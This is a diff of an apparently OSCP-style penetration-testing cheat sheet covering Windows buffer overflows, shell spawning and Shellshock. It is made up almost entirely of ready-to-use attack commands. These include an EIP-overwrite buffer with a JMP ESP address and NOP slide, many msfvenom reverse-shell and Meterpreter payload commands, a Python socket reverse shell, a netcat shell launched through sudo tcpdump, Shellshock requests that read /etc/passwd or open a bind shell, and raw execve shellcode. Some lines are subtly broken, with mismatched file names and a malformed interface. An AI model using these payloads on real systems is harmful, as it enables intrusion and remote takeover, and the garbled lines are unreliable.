@@ -771,55 +771,62 @@ Buffer Overflows and Exploits
 -   DEP and ASLR - Data Execution Prevention (DEP) and Address Space
     Layout Randomization (ASLR)
 
+
+-   Nmap Fuzzers:
+
+    -   NMap Fuzzer List  
+        [https://nmap.org/nsedoc/categories/fuzzer.html](https://nmap.org/nsedoc/categories/fuzzer.html)
+
+    -   NMap HTTP Form Fuzzer  
+        nmap --script http-form-fuzzer --script-args
+        'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}'
+        -p 80 $ip
+
+    -   Nmap DNS Fuzzer  
+        nmap --script dns-fuzz --script-args timelimit=2h $ip -d
+
 -   MSFvenom  
     [*https://www.offensive-security.com/metasploit-unleashed/msfvenom/*](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
 
 -   Windows Buffer Overflows
 
     -   Controlling EIP
+    
+             locate pattern_create
+             pattern_create.rb -l 2700
+             locate pattern_offset
+             pattern_offset.rb -q 39694438
 
-    -   locate pattern\_create
+    -   Verify exact location of EIP - [\*] Exact match at offset 2606
 
-    -   pattern\_create.rb -l 2700
-
-    -   locate pattern\_offset
-
-    -   pattern\_offset.rb -q 39694438
-
-    -   Verify exact location of EIP - \[\*\] Exact match at offset 2606
-
-    -   buffer = "A" \* 2606 + "B" \* 4 + "C" \* 90
+            buffer = "A" \* 2606 + "B" \* 4 + "C" \* 90
 
     -   Check for “Bad Characters” - Run multiple times 0x00 - 0xFF
 
     -   Use Mona to determine a module that is unprotected
 
-    -   Bypass DEP if present by finding a Memory Location with Read and
-        Execute access for JMP ESP
-
-    -   Otherwise without DEP, we can stick our
+    -   Bypass DEP if present by finding a Memory Location with Read and Execute access for JMP ESP
 
     -   Use NASM to determine the HEX code for a JMP ESP instruction
 
-        -   /usr/share/metasploit-framework/tools/exploit/nasm\_shell.rb
+            /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 
-        -   JMP ESP  
+            JMP ESP  
             00000000 FFE4 jmp esp
 
     -   Run Mona in immunity log window to find (FFE4) XEF command
 
-    -   !mona find -s "\\xff\\xe4" -m slmfc.dll  
-        found at 0x5f4a358f - Flip around for little endian format
+            !mona find -s "\xff\xe4" -m slmfc.dll  
+            found at 0x5f4a358f - Flip around for little endian format
+            buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390
 
-    -   buffer = "A" \* 2606 + "\\x8f\\x35\\x4a\\x5f" + "C" \* 390
-
-    -   MSFVenom to create payload  
-        msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=443 -f c
-        –e x86/shikata\_ga\_nai -b "\\x00\\x0a\\x0d"
+    -   MSFVenom to create payload
+    
+            msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
 
     -   Final Payload with NOP slide  
-        buffer="A"\*2606 + "\\x8f\\x35\\x4a\\x5f" + "\\x90" \* 8 +
-        shellcode
+    
+            buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
 
     -   Create a PE Reverse Shell  
         msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444
@@ -874,141 +881,129 @@ Shells
 ===================================================================================================================================
 
 -   Netcat Shell Listener  
-    nc -nlvp 443
+
+    `nc -nlvp 4444`
 
 -   Spawning a TTY Shell - Break out of Jail or limited shell
          You should almost always upgrade your shell after taking control of an apache or www user.
+         
         (For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )
+        
         (hint: sudo -l to see what you can run)
         
      -   You may encounter limited shells that use rbash and only allow you to execute a single command per session.
          You can overcome this by executing an SSH shell to your localhost:
          
-         `ssh user@$ip nc $localip 4444 -e /bin/sh`
+               ssh user@$ip nc $localip 4444 -e /bin/sh
+               enter user's password
+               python -c 'import pty; pty.spawn("/bin/sh")'
+               export TERM=linux
          
-         `enter user's password`
-         
-         `python -c 'import pty; pty.spawn("/bin/sh")'`
-         
-         `export TERM=linux`
-         
+      `python -c 'import pty; pty.spawn("/bin/sh")'`
 
-     -   python -c 'import pty; pty.spawn("/bin/sh")'
+               python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);          s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
 
-     -   python -c 'import
-         socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);
-         s.connect(("$ip",1234));os.dup2(s.fileno(),0);
-         os.dup2(s.fileno(),1);
-         os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
+      `echo os.system('/bin/bash')`
 
-     -   echo os.system('/bin/bash')
+      `/bin/sh -i`
 
-     -   /bin/sh -i
+      `perl —e 'exec "/bin/sh";'`
 
-     -   perl —e 'exec "/bin/sh";'
+      perl: `exec "/bin/sh";`
 
-     -   perl: exec "/bin/sh";
+      ruby: `exec "/bin/sh"`
 
-     -   ruby: exec "/bin/sh"
+      lua: `os.execute('/bin/sh')`
 
-     -   lua: os.execute('/bin/sh')
+      From within IRB: `exec "/bin/sh"`
 
-     -   (From within IRB)  
-         exec "/bin/sh"
 
-     -   (From within vi)  
-         :!bash
+      From within vi: `:!bash`
+     or
+     
+      `:set shell=/bin/bash:shell`
+     
+      From within vim `':!bash':`
 
-     -   From within vim  
-         Breaking out of vim is done by ':!bash':
+      From within nmap: `!sh`
 
-     -   (From within vi)  
-         :set shell=/bin/bash:shell
+      From within tcpdump
+      
+         echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root
 
-     -   (From within nmap)  
-         !sh
-
-     -   (From within tcpdump)  
-         echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ >
-         /tmp/.test  
-         chmod +x /tmp/.test  
-         sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst
-         –Z root
-
-     -   from busybox  
-         /bin/busybox telnetd -|/bin/sh -p9999
+      From busybox  `/bin/busybox telnetd -|/bin/sh -p9999`
 
 -   Pen test monkey PHP reverse shell  
-    [*http://pentestmonkey.net/tools/web-shells/php-reverse-shel*](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+    [http://pentestmonkey.net/tools/web-shells/php-reverse-shel](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 
 -   php-findsock-shell - turns PHP port 80 into an interactive shell  
-    [*http://pentestmonkey.net/tools/web-shells/php-findsock-shell*](http://pentestmonkey.net/tools/web-shells/php-findsock-shell)
+    [http://pentestmonkey.net/tools/web-shells/php-findsock-shell](http://pentestmonkey.net/tools/web-shells/php-findsock-shell)
 
 -   Perl Reverse Shell  
-    [*http://pentestmonkey.net/tools/web-shells/perl-reverse-shell*](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)
+    [http://pentestmonkey.net/tools/web-shells/perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)
 
 -   PHP powered web browser Shell b374k with file upload etc.  
-    [*https://github.com/b374k/b374k*](https://github.com/b374k/b374k)
+    [https://github.com/b374k/b374k](https://github.com/b374k/b374k)
 
 -   Windows reverse shell - PowerSploit’s Invoke-Shellcode script and inject a Meterpreter shell 
     https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1
     
--   Web Backdoors from Fuzzdb (
+-   Web Backdoors from Fuzzdb 
     https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors
 
 -   Creating Meterpreter Shells with MSFVenom - http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/
       
       *Linux*
       
-      msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
+      `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf`
       
       *Windows*
       
-      msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+      `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`
       
       *Mac*
 
-      msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
+      `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho`
       
       **Web Payloads**
       
       *PHP*
       
-      msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+      `msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
       
       OR
       
-      msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+      `msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
       
       Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage:
       
-      cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+      `cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`
       
       *ASP*
 
-      msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
+      `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`
       
       *JSP*
 
-      msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
+      `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`
       
       *WAR*
 
-      msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+      `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`
       
       **Scripting Payloads**
       
       *Python*
 
-      msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
+      `msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py`
       
       *Bash*
 
-      msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
+      `msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh`
       
       *Perl*
 
-      msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
+      `msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl`
       
       **Shellcode**
       
@@ -1016,118 +1011,52 @@ Shells
 
       *Linux Based Shellcode*
 
-      msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+      `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
       
       *Windows Based Shellcode*
 
-      msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+      `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
       
       *Mac Based Shellcode*
 
-      msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+      `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
 
       **Handlers**
       Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
 
-      use exploit/multi/handler
-      
-      set PAYLOAD <Payload name>
-      
-      set LHOST <LHOST value>
-      
-      set LPORT <LPORT value>
-      
-      set ExitOnSession false
-      
-      exploit -j -z
+         use exploit/multi/handler
+         set PAYLOAD <Payload name>
+         set LHOST <LHOST value>
+         set LPORT <LPORT value>
+         set ExitOnSession false
+         exploit -j -z
       
       Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘
 
--   SSH to Meterpreter:
+-   SSH to Meterpreter: https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/
 
-      use auxiliary/scanner/ssh/ssh_login
-      
-      use post/multi/manage/shell_to_meterpreter
-      
-      https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/
-
--   Compiling Windows Exploits on Kali
-
-    -   wget -O mingw-get-setup.exe
-        http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download  
-        wine mingw-get-setup.exe  
-        select mingw32-base
-
-    -   cd /root/.wine/drive\_c/windows  
-        wget http://gojhonny.com/misc/mingw\_bin.zip && unzip
-        mingw\_bin.zip  
-        cd /root/.wine/drive\_c/MinGW/bin  
-        wine gcc -o ability.exe /tmp/exploit.c -lwsock32  
-        wine ability.exe
-
--   Cross Compiling Exploits
-
-    -   gcc -m32 -o output32 hello.c (32 bit)  
-        gcc -m64 -o output hello.c (64 bit)
+         use auxiliary/scanner/ssh/ssh_login
+         use post/multi/manage/shell_to_meterpreter
 
 -   Shellshock
 
     -   git clone <https://github.com/nccgroup/shocker>
 
-    -   ./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c
-        /cgi-bin/status --verbose
+    -   `./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose`
 
     -   Shell Shock SSH Forced Command  
         Check for forced command by enabling all debug output with ssh  
-        ssh -vvv  
-        ssh -i noob noob@$ip '() { :;}; /bin/bash'
+        
+              ssh -vvv  
+              ssh -i noob noob@$ip '() { :;}; /bin/bash'
 
     -   cat file (view file contents)  
-        echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {
-        :;}; echo \\$(</etc/passwd)\\r\\nHost:
-        vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
+    
+              echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; echo \\$(</etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
 
     -   Shell Shock run bind shell  
-        echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {
-        :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:
-        vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
-
-    -   Shell Shock reverse Shell  
-        nc -l -p 443
-
--   Buffer Overflow Exploits
-
-    -   Pass 1000 A’s as a parameter  
-        ./r00t $(python -c 'print "A" \* 1000')
-
-    -   Random Pattern Create  
-        /usr/share/metasploit-framework/tools\# ruby pattern\_create.rb
-        1000
-
-    -   Determine Pattern offset  
-        ruby pattern\_offset.rb 0x6a413969
-
-    -   Pass shell with offset value  
-        env - ./r00t $(python -c 'print "A"\*268 +
-        "\\x80\\xfc\\xff\\xbf" + "\\x90"\*16 +
-        "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"')  
-        \# id
-
-    -   From Fuzzing to Zero Day  
-        https://blog.techorganic.com/2014/05/14/from-fuzzing-to-0-day/
-
--   Nmap Fuzzers:
-
-    -   NMap Fuzzer List  
-        [*https://nmap.org/nsedoc/categories/fuzzer.html*](https://nmap.org/nsedoc/categories/fuzzer.html)
-
-    -   NMap HTTP Form Fuzzer  
-        nmap --script http-form-fuzzer --script-args
-        'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}'
-        -p 80 $ip
-
-    -   Nmap DNS Fuzzer  
-        nmap --script dns-fuzz --script-args timelimit=2h $ip -d
+    
+             echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
 
 File Transfers
 ============================================================================================================
